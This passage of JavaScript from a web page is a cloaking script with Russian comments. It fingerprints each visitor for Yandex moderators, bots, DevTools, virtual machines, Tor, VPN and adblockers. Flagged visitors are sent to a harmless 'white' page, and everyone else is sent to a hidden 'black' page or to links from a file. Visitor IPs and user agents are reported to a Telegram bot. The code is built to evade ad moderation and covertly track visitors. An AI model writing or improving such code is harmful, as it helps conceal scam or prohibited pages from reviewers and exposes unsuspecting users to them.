                     clearTimeout(timeoutOrg);
                    if (orgResponse.ok) {
                        const org = await orgResponse.text();
                        if (org && org.toLowerCase().includes('yandex')) {
                            logDebug("isYandexBot: true (по организации IP)");
                            return true;
                        }
                        logDebug(`Организация IP: ${org}`);
                    }
                } catch (e) {
                    logDebug("Ошибка при проверке IP Яндекса:", e.name === 'AbortError' ? 'Timeout' : e);
                }
            }

            logDebug("isYandexBot: false (проверки не выявили)");
            return false;
        }

        // Проверка, находится ли IP в черном списке (из оригинала)
        async function isIpBlocked() {
            const currentIp = userInfo?.ipAddress;
            if (!currentIp || currentIp === "Не определено") return false;

            try {
                const blacklistText = await loadFile('blckip.txt');
                if (!blacklistText) return false;

                const blockedIps = blacklistText.split('\n').map(ip => ip.trim()).filter(ip => ip);
                const result = blockedIps.includes(currentIp);
                logDebug(`isIpBlocked: ${result} (IP: ${currentIp})`);
                return result;
            } catch (e) {
                logDebug("Ошибка при проверке черного списка IP:", e);
                return false;
            }
        }

        // Проверка признаков модератора/разработчика (из оригинала)
        function isLikelyModerator() {
            // Проверка DevTools по размеру окна
            const isYandexRegularUser = isRegularYandexUser(); // Учитываем Я.Браузер
            const minWidthDiff = isYandexRegularUser ? 150 : 100;
            const minHeightDiff = isYandexRegularUser ? 150 : 100;

            if (window.outerWidth - window.innerWidth > minWidthDiff ||
                window.outerHeight - window.innerHeight > minHeightDiff) {
                logDebug("isLikelyModerator: true (по размеру окна)");
                return true;
            }

            // Проверка на WebDriver
            if (navigator.webdriver) {
                 logDebug("isLikelyModerator: true (по navigator.webdriver)");
                 return true;
            }

            // Проверка на расширения для разработчиков
            if (typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined' ||
                typeof window.__REDUX_DEVTOOLS_EXTENSION__ !== 'undefined' ||
                typeof window.__VUE_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined') { // Добавил Vue
                 logDebug("isLikelyModerator: true (по DevTools Extensions)");
                return true;
            }

            // Проверка времени выполнения console.log (timing attack)
            let slowConsole = false;
            if (!isYandexRegularUser && config.experimental.PerformTimingAttacks) { // Проверяем флаг конфига
                try {
                    const start = performance.now();
                    // Используем console.debug как в оригинале
                    for(let i = 0; i < 1000; i++) { console.debug(''); }
                    console.clear();
                    const end = performance.now();
                    // Порог из оригинала - 5мс, но он очень низкий, лучше 15-20
                    if (end - start > 20) { // Увеличил порог
                        slowConsole = true;
                        logDebug(`isLikelyModerator: true (по медленной консоли: ${end - start}ms)`);
                    }
                } catch(e) { /* Игнорируем ошибки консоли */ }
            }

            logDebug(`isLikelyModerator: ${slowConsole}`);
            return slowConsole;
        }

        // ===== ЭКСПЕРИМЕНТАЛЬНЫЕ ПРОВЕРКИ (определения из оригинала) =====

        /**
         * Определение блокировщика рекламы
         */
        function detectAdblocker() {
            if (!config.experimental.CheckAdBlocker) return false;
            logDebug("Проверка AdBlock...");
            let isBlocked = false;
            try {
                const testAd = document.createElement('div');
                testAd.innerHTML = '&nbsp;';
                // Классы, часто блокируемые AdBlock/uBlock
                testAd.className = 'adsbox ad ad-banner banner_ad ad-container textads';
                testAd.style.position = 'absolute';
                testAd.style.left = '-9999px';
                testAd.style.height = '1px'; // Задаем высоту, чтобы offsetHeight был > 0
                document.body.appendChild(testAd);

                // Проверяем, скрыт ли элемент или его высота = 0
                isBlocked = !testAd.offsetHeight || testAd.style.display === 'none' || testAd.style.visibility === 'hidden';
                document.body.removeChild(testAd);
                logDebug(`detectAdblocker: ${isBlocked}`);
            } catch (e) {
                logDebug("Ошибка при проверке AdBlock:", e);
                isBlocked = false; // Считаем, что нет, если ошибка
            }
            return isBlocked;
        }

        /**
         * Определение виртуальной машины
         */
        function checkForVirtualMachine() {
            if (!config.experimental.CheckVirtualMachine) return false;
            logDebug("Проверка VM...");
            let isVM = false;

            if (isRegularYandexUser()) {
                logDebug("Проверка VM пропущена для Yandex User");
                return false;
            }

            // Низкое количество ядер/память
            if (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 1) { isVM = true; logDebug("VM: Низкое hardwareConcurrency"); }
            if (navigator.deviceMemory && navigator.deviceMemory <= 1) { isVM = true; logDebug("VM: Низкая deviceMemory"); }

            // Паттерны в User-Agent
            if (/VMware|VirtualBox/i.test(userAgent)) { isVM = true; logDebug("VM: UA содержит VMware/VirtualBox"); }

            // Можно добавить проверку WebGL renderer info, если нужно
            // const canvas = document.createElement('canvas');
            // const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            // if (gl) {
            //     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            //     if (debugInfo) {
            //         const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            //         if (renderer && /llvmpipe|swiftshader|virtualbox|vmware/i.test(renderer)) {
            //             isVM = true; logDebug(`VM: Подозрительный WebGL renderer: ${renderer}`);
            //         }
            //     }
            // }

            logDebug(`checkForVirtualMachine: ${isVM}`);
            return isVM;
        }

        /**
         * Определение сети Tor
         */
        async function checkTorNetwork() {
            if (!config.experimental.CheckTorNetwork) return false;
            logDebug("Проверка Tor...");

            // Проверка через внешний сервис (как в оригинале)
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 сек таймаут
                const response = await fetch('https://check.torproject.org/api/ip', { signal: controller.signal });
                clearTimeout(timeoutId);
                if (response.ok) {
                    const data = await response.json();
                    if (data.IsTor === true) {
                        logDebug("checkTorNetwork: true (по API torproject)");
                        return true;
                    }
                }
            } catch (e) {
                logDebug("Ошибка при проверке Tor через API:", e.name === 'AbortError' ? 'Timeout' : e);
            }

            // Резервная проверка по признакам браузера Tor (как в оригинале)
            if (/Tor/i.test(userAgent) || (navigator.plugins && navigator.plugins.length === 0 && window.screen.width === 1000 && window.screen.height === 1000)) {
                logDebug("checkTorNetwork: true (по признакам браузера)");
                return true;
            }

            logDebug("checkTorNetwork: false");
            return false;
        }

        /**
         * Определение прокси или VPN (требует API ключ или платный сервис для надежности)
         * Используем ipqualityscore как в оригинале, но он может требовать ключ.
         * Без ключа его точность может быть низкой.
         */
        async function detectProxiesOrVPN() {
            if (!config.experimental.CheckVPN) return false;
            logDebug("Проверка Proxy/VPN...");
            const currentIp = userInfo?.ipAddress;
            if (!currentIp || currentIp === "Не определено") return false;

            // !!! ВАЖНО: ipqualityscore может требовать API ключ для точной работы !!!
            // Бесплатные проверки могут быть неточными или иметь лимиты.
            const apiKey = "YOUR_IPQUALITYSCORE_API_KEY"; // <-- Вставьте ваш ключ сюда, если есть
            const apiUrl = `https://ipqualityscore.com/api/json/ip/${apiKey}/${currentIp}?strictness=0&lightweight=true&mobile=true`;

            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 сек таймаут
                const response = await fetch(apiUrl, { signal: controller.signal });
                 clearTimeout(timeoutId);

                if (response.ok) {
                    const data = await response.json();
                    // Проверяем флаги, возвращаемые API
                    const isProxy = data.proxy || data.vpn || data.tor;
                    logDebug(`detectProxiesOrVPN: ${isProxy} (proxy: ${data.proxy}, vpn: ${data.vpn}, tor: ${data.tor})`);
                    return isProxy;
                } else {
                     logDebug(`Ошибка API ipqualityscore: ${response.status}`);
                }
            } catch (e) {
                logDebug("Ошибка при проверке прокси/VPN через API:", e.name === 'AbortError' ? 'Timeout' : e);
            }

            logDebug("detectProxiesOrVPN: false (ошибка или не обнаружено)");
            return false;
        }

        /**
         * Проверка WebRTC для обнаружения VPN (из оригинала)
         */
        async function checkWebRTCLeakage() {
            if (!config.experimental.CheckWebRTCLeakage) return false;
            logDebug("Проверка утечки WebRTC...");

            return new Promise(async (resolve) => {
                const publicIp = userInfo?.ipAddress; // Используем уже полученный IP
                if (!publicIp || publicIp === "Не определено") {
                    logDebug("WebRTC: Публичный IP не определен.");
                    return resolve(false);
                }

                let foundLeak = false;
                try {
                    if (typeof RTCPeerConnection === 'undefined') {
                         logDebug("WebRTC: RTCPeerConnection не поддерживается.");
                         return resolve(false);
                    }

                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('');

                    // Таймер на случай, если onicecandidate не сработает
                    const timeoutId = setTimeout(() => {
                        if (!foundLeak) {
                            logDebug("WebRTC: Таймаут ожидания ICE candidate.");
                            pc.close();
                            resolve(false);
                        }
                    }, 2000); // 2 секунды ожидания

                    pc.onicecandidate = (ice) => {
                        if (foundLeak) return; // Уже нашли утечку, не обрабатываем дальше

                        if (!ice || !ice.candidate || !ice.candidate.candidate) {
                            // Кандидаты закончились или пустой кандидат
                            if (!foundLeak) {
                                clearTimeout(timeoutId);
                                pc.close();
                                resolve(false); // Утечки не найдено
                            }
                            return;
                        }

                        // Ищем локальный IP в кандидате
                        const localIpMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+:+[a-f0-9]+)/.exec(ice.candidate.candidate);
                        if (localIpMatch && localIpMatch.length > 1) {
                            const localIp = localIpMatch[1];
                            // Игнорируем локальные адреса и адреса самого себя
                            if (localIp !== publicIp &&
                                !localIp.startsWith('192.168.') &&
                                !localIp.startsWith('10.') &&
                                !localIp.startsWith('172.') && // Более полный диапазон частных сетей
                                !localIp.startsWith('169.254.') && // Link-local
                                !localIp.startsWith('fe80:') && // IPv6 Link-local
                                !localIp.startsWith('::1'))    // IPv6 Loopback
                            {
                                logDebug(`WebRTC: Обнаружена утечка! Публичный IP: ${publicIp}, Локальный IP: ${localIp}`);
                                foundLeak = true;
                                clearTimeout(timeoutId);
                                pc.close();
                                resolve(true); // Найдена утечка
                            }
                        }
                    };

                    // Запускаем процесс сбора кандидатов
                    pc.createOffer()
                      .then(offer => pc.setLocalDescription(offer))
                      .catch(err => {
                          logDebug("WebRTC: Ошибка createOffer/setLocalDescription:", err);
                          clearTimeout(timeoutId);
                          pc.close();
                          resolve(false);
                      });

                } catch (e) {
                    logDebug("WebRTC: Критическая ошибка:", e);
                    resolve(false); // Считаем, что утечки нет при ошибке
                }
            });
        }

        /**
         * Выполнение тайминг-атак для определения отладчика (из оригинала)
         */
        function performTimingAttacks() {
            if (!config.experimental.PerformTimingAttacks) return false;
            logDebug("Проверка тайминг-атакой...");

            if (isRegularYandexUser()) {
                 logDebug("Тайминг-атака пропущена для Yandex User");
                 return false;
            }

            let isDebugging = false;
            try {
                const start = performance.now();
                // Используем console.debug как в оригинале
                for (let i = 0; i < 1000; i++) {
                    console.debug('');
                }
                console.clear();
                const end = performance.now();
                const duration = end - start;

                // Порог из оригинала - 20мс
                if (duration > 20) {
                    isDebugging = true;
                    logDebug(`performTimingAttacks: true (время выполнения: ${duration.toFixed(1)}ms)`);
                } else {
                    logDebug(`performTimingAttacks: false (время выполнения: ${duration.toFixed(1)}ms)`);
                }
            } catch(e) { /* Игнорируем ошибки консоли */ }

            return isDebugging;
        }


        // ===== ОСНОВНАЯ ЛОГИКА =====

        // Определение итогового URL для перенаправления
        async function determineRedirectTarget() {
            // Предотвращаем повторный вызов, если редирект уже инициирован
            if (redirectInitiated) {
                logDebug("Определение цели прервано: редирект уже инициирован.");
                return null; // Возвращаем null, чтобы не вызывать redirect() снова
            }
            logDebug("Определение целевого URL...");
            let targetUrl = BLACK_PAGE; // По умолчанию - черная страница
            blockReason = ''; // Сбрасываем причину перед новой проверкой

            try {
                // 1. Загрузка конфигурации и статуса (делаем это один раз)
                if (!determineRedirectTarget.configLoaded) {
                    const configText = await loadFile('config.txt');
                    parseConfig(configText); // Применяем конфиг
                    const onOffText = await loadFile('onoff.txt');
                    onOffState = onOffText ? onOffText.trim().toLowerCase() : 'on';
                    logDebug(`Статус onoff.txt: ${onOffState}`);
                    determineRedirectTarget.configLoaded = true; // Флаг, что загрузили
                }

                // 2. Сбор информации о пользователе (если еще не собрана)
                if (!userInfo) {
                    await collectUserInfo();
                }

                // 3. Применение проверок (в порядке приоритета)
                const deviceConfig = isMobile ? config.mobile : config.desktop;

                // --- Основные проверки ---
                if (botTrapActivated) { blockReason = "Активирована ловушка для ботов"; }
                else if (deviceConfig.CheckIpBlacklist && await isIpBlocked()) { blockReason = "IP в черном списке"; }
                else if (deviceConfig.CheckSearchBots && isSearchBotUA()) { blockReason = "Обнаружен поисковый бот (UA)"; }
                else if (deviceConfig.CheckYandexBot && await isYandexBot()) { blockReason = "Обнаружен бот/модератор Яндекса"; }
                else if (deviceConfig.CheckHeadlessBrowser && isHeadlessBrowser()) { blockReason = "Обнаружен headless браузер"; }
                else if (deviceConfig.CheckYandexModerator && hasYandexModeratorIframe()) { blockReason = "Обнаружен iframe модерации"; }
                else if (deviceConfig.CheckVisitFrequency && isBlockedByFrequency()) { blockReason = "Превышена частота посещений"; }
                else if (deviceConfig.CheckDevTools && isLikelyModerator()) { blockReason = "Подозрение на DevTools/Модератора"; }
                // --- Проверка движения мыши обрабатывается отдельно таймаутом ---

                // --- Экспериментальные проверки (если основные не сработали) ---
                else if (config.experimental.CheckAdBlocker && detectAdblocker()) { blockReason = "Обнаружен AdBlock"; }
                else if (config.experimental.CheckVirtualMachine && checkForVirtualMachine()) { blockReason = "Обнаружена VM"; }
                else if (config.experimental.CheckTorNetwork && await checkTorNetwork()) { blockReason = "Обнаружена сеть Tor"; }
                else if (config.experimental.CheckVPN && await detectProxiesOrVPN()) { blockReason = "Обнаружен Proxy/VPN"; }
                else if (config.experimental.CheckWebRTCLeakage && await checkWebRTCLeakage()) { blockReason = "Обнаружена утечка WebRTC (VPN?)"; }
                else if (config.experimental.PerformTimingAttacks && performTimingAttacks()) { blockReason = "Обнаружен отладчик (тайминг-атака)"; }


                // 4. Если причина блокировки найдена -> WHITE_PAGE
                if (blockReason) {
                    logDebug(`Редирект на WHITE_PAGE. Причина: ${blockReason}`);
                    targetUrl = WHITE_PAGE;
                    // Отправляем отчет только если причина блокировки установлена
                    await sendTelegramReport(blockReason, userInfo);
                } else {
                    // 5. Если все чисто -> BLACK_PAGE или ссылка из links.txt
                    logDebug("Проверки пройдены. Редирект на BLACK_PAGE или links.txt.");
                    const codeParam = getUrlParameter('code');
                    if (codeParam) {
                        logDebug(`Найден параметр code=${codeParam}. Загрузка links.txt...`);
                        try {
                            const linksText = await loadFile('links.txt');
                            if (linksText) {
                                const links = linksText.split('\n').map(link => link.trim()).filter(link => link);
                                const codeNumber = parseInt(codeParam);
                                if (!isNaN(codeNumber) && codeNumber > 0 && codeNumber <= links.length) {
                                    targetUrl = links[codeNumber - 1];
                                    logDebug(`Выбрана ссылка №${codeNumber}: ${targetUrl}`);
                                } else {
                                    const randomIndex = Math.floor(Math.random() * links.length);
                                    targetUrl = links[randomIndex];
                                    logDebug(`Неверный code=${codeParam}. Выбрана случайная ссылка №${randomIndex + 1}: ${targetUrl}`);
                                }
                            } else {
                                logDebug("Файл links.txt пуст или не загружен, используется BLACK_PAGE.");
                                targetUrl = BLACK_PAGE;
                            }
                        } catch (e) {
                            logDebug("Ошибка при обработке links.txt, используется BLACK_PAGE:", e);
                            targetUrl = BLACK_PAGE;
                        }
                    } else {
                         logDebug("Параметр code не найден, используется BLACK_PAGE.");
                         targetUrl = BLACK_PAGE;
                    }
                }

            } catch (error) {
                console.error("Критическая ошибка при определении цели редиректа:", error);
                logDebug("Критическая ошибка:", error);
                targetUrl = WHITE_PAGE; // В случае любой ошибки - на белую страницу
                blockReason = `Критическая ошибка скрипта: ${error.message}`; // Устанавливаем причину
                try {
                    // Пытаемся отправить отчет об ошибке
                    await sendTelegramReport(blockReason, userInfo || { deviceType: isMobile ? 'Моб' : 'ПК', error: 'UserInfo недоступен' });
                } catch (e) { console.error("Не удалось отправить отчет об ошибке:", e); }
            }

            return targetUrl;
        }
        determineRedirectTarget.configLoaded = false; // Статический флаг для функции

        // Перенаправление на целевую страницу
        function redirect(url) {
            // Предотвращаем повторный вызов или редирект без URL
            if (redirectInitiated || !url) {
                 logDebug(`Редирект на "${url}" прерван (уже инициирован: ${redirectInitiated}, URL пуст: ${!url})`);
                 return;
            }
            redirectInitiated = true;
            logDebug(`Инициирован редирект на: ${url}`);

            // Убираем блок проверки и лоадер перед редиректом
            if (humanVerificationBlock) humanVerificationBlock.classList.add('hidden');
            const loaderContainer = document.querySelector('.loader-container');
            if (loaderContainer) loaderContainer.style.display = 'none';


            const delay = isMobile ? config.mobile.RedirectDelay : config.desktop.RedirectDelay;
            logDebug(`Задержка редиректа: ${delay} мс`);

            setTimeout(() => {
                try {
                    pageFullyLoaded = true; // Флаг для beforeunload
                    window.location.href = url;
                } catch (e) {
                    console.error("Ошибка при выполнении редиректа (window.location.href):", e);
                    // Попытка редиректа другим способом
                    try {
                        logDebug("Попытка редиректа через window.location.replace...");
                        window.location.replace(url);
                     } catch (e2) {
                        console.error("Ошибка при выполнении редиректа (window.location.replace):", e2);
                     }
                }
            }, delay);
        }

        // ===== ОБРАБОТЧИКИ СОБЫТИЙ И ИНИЦИАЛИЗАЦИЯ =====

        // --- Ранняя проверка на очевидных ботов по UA ---
        if (isSearchBotUA() && (config.desktop.CheckSearchBots || config.mobile.CheckSearchBots)) {
            logDebug("Обнаружен бот по UA до DOMContentLoaded. Редирект на WHITE_PAGE.");
            blockReason = "Обнаружен поисковый бот (UA, ранняя проверка)";
            // Собираем минимальную инфу для отчета
            const earlyInfo = { userAgent: userAgent, timestamp: new Date().toISOString(), deviceType: isMobile ? 'Моб' : 'ПК', ipAddress: 'Определение...' };
            sendTelegramReport(blockReason, earlyInfo); // Отправляем отчет
            redirect(WHITE_PAGE); // Редирект
            // Если редирект инициирован, дальнейшее выполнение скрипта не нужно
            return;
        }
        // --- Конец ранней проверки ---


        // Инициализация после загрузки DOM
        document.addEventListener('DOMContentLoaded', async () => {
            logDebug("DOMContentLoaded сработало.");
            humanVerificationBlock = document.querySelector('.human-verification');

            // Настройка наблюдателя за iframe модерации (если включено)
            if (config.desktop.CheckYandexModerator || config.mobile.CheckYandexModerator) {
                setupModerationFrameObserver();
            }

            // Для мобильных устройств
            if (isMobile) {
                hadMouseMovement = true; // Считаем, что движение есть
                if (humanVerificationBlock) humanVerificationBlock.classList.add('hidden');
                logDebug("Мобильное устройство, скрыта проверка мыши.");
                const target = await determineRedirectTarget(); // Определяем цель
                redirect(target); // Редиректим
            }
            // Для десктопных устройств
            else {
                if (!humanVerificationBlock) {
                     console.error("Блок .human-verification не найден!");
                     // Если блока нет, но проверка мыши включена, сразу считаем подозрительным
                     if(config.desktop.CheckMouseMovement && !redirectInitiated) {
                         logDebug("Блок проверки мыши не найден, считаем подозрительным.");
                         blockReason = "Отсутствие блока проверки мыши";
                         await collectUserInfo(); // Собрать инфо для отчета
                         await sendTelegramReport(blockReason, userInfo);
                         redirect(WHITE_PAGE);
                         return; // Выход
                     }
                }

                // Устанавливаем таймер проверки движения мыши, если включено
                if (config.desktop.CheckMouseMovement) {
                    logDebug(`Установка таймаута (${config.desktop.MouseMovementTimeout} мс) для проверки движения мыши.`);
                    // Очищаем старый таймер, если он вдруг есть
                    if (mouseMoveTimeout) clearTimeout(mouseMoveTimeout);

                    mouseMoveTimeout = setTimeout(async () => {
                        // Проверяем, что редирект еще не начался по другой причине
                        if (!hadMouseMovement && !redirectInitiated) {
                            logDebug("Таймаут! Движения мыши не было.");
                            blockReason = "Отсутствие движения мыши (таймаут)";
                            if (!userInfo) await collectUserInfo(); // Собрать инфо, если нужно
                            await sendTelegramReport(blockReason, userInfo);
                            redirect(WHITE_PAGE);
                        } else {
                             logDebug("Таймаут мыши: движение было или редирект уже идет.");
                        }
                    }, config.desktop.MouseMovementTimeout);
                } else {
                    // Если проверка мыши отключена, но это десктоп, запускаем определение цели сразу
                    logDebug("Проверка мыши отключена для десктопа, определяем цель...");
                    // Проверяем, что редирект еще не начался
                    if (!redirectInitiated) {
                        const target = await determineRedirectTarget();
                        redirect(target);
                    }
                }
            }
        });

        // Обработчик движения мыши (только для десктопа)
        if (!isMobile) {
            const handleMouseMove = async () => {
                // Срабатывает только один раз при первом движении
                if (!hadMouseMovement && !redirectInitiated) {
                    hadMouseMovement = true;
                    logDebug("Обнаружено движение мыши.");
                    if (humanVerificationBlock) humanVerificationBlock.classList.add('hidden');

                    // Очищаем таймаут ожидания движения
                    if (mouseMoveTimeout) {
                        clearTimeout(mouseMoveTimeout);
                        mouseMoveTimeout = null;
                        logDebug("Таймаут проверки мыши отменен.");
                    }

                    // Запускаем определение цели и редирект после движения
                    // (Таймер нужен, чтобы не редиректить мгновенно при случайном движении)
                    if (!redirectTimeout) {
                         redirectTimeout = setTimeout(async () => {
                            logDebug("Запуск определения цели после движения мыши...");
                            const target = await determineRedirectTarget();
                            // Редиректим, если цель определена и не равна null (null если редирект уже идет)
                            if(target) {
                                redirect(target);
                            }
                        }, 50); // Короткая задержка после первого движения
                    }
                }
            };
            // Используем { once: true } для оптимизации, срабатывает один раз
            document.addEventListener('mousemove', handleMouseMove, { once: true, passive: true });
        }

        // Настройка ловушки для ботов
        const trapLink = document.querySelector('.bot-trap-link');
        if (trapLink) {
            trapLink.addEventListener('click', async (e) => {
                e.preventDefault();
                if (botTrapActivated || redirectInitiated) return; // Не реагировать повторно или если уже редиректим
                botTrapActivated = true;
                blockReason = "Клик по ловушке для ботов (.bot-trap-link)";
                logDebug(`🚨 ${blockReason}!`);
                if (!userInfo) await collectUserInfo(); // Собрать инфо, если нужно
                await sendTelegramReport(blockReason, userInfo);
                redirect(WHITE_PAGE); // Немедленный редирект на белую
            });
        } else {
            console.warn("Элемент .bot-trap-link не найден.");
        }

        // Обработчик раннего ухода
        window.addEventListener('beforeunload', () => {
            // Проверяем, что страница не была полностью загружена (редирект не сработал)
            // и что редирект не был инициирован по какой-либо причине
            if (!pageFullyLoaded && !redirectInitiated) {
                logDebug("Попытка раннего ухода со страницы.");
                const finalBlockReason = blockReason || "Ранний уход (причина не установлена)";
                // Собираем минимальные данные синхронно, если возможно
                const earlyInfo = {
                    reason: finalBlockReason,
                    ts: new Date().toISOString(),
                    ua: userAgent.substring(0,100),
                    ip: userInfo?.ipAddress || '?',
                    loadT: Math.round(performance.now() - PAGE_LOAD_START),
                    vCount: visitCount
                };
                const message = `🚪 УХОД / НЕЗАВЕРШЕННЫЙ РЕДИРЕКТ\nПричина: ${earlyInfo.reason}\nIP: ${earlyInfo.ip}\nUA: ${earlyInfo.ua}...\nВремя: ${earlyInfo.loadT}мс\nВизит: ${earlyInfo.vCount}`;

                // Используем sendBeacon для отправки данных (более надежно при закрытии)
                if (navigator.sendBeacon && config.common.TelegramReporting) {
                    const blob = new Blob([JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })], { type: 'application/json' });
                    try {
                       // sendBeacon не гарантирует доставку, но это лучший вариант
                       const sent = navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, blob);
                       logDebug(`Отчет о раннем уходе через sendBeacon ${sent ? 'отправлен (в очередь)' : 'не отправлен'}.`);
                    } catch (e) {
                       logDebug("Ошибка sendBeacon:", e);
                    }
                }
            } else {
                 logDebug(`Beforeunload: страница загружена (${pageFullyLoaded}) или редирект инициирован (${redirectInitiated}). Отчет не отправляется.`);
            }
        });

    })();
    </script>

</body>
</html>
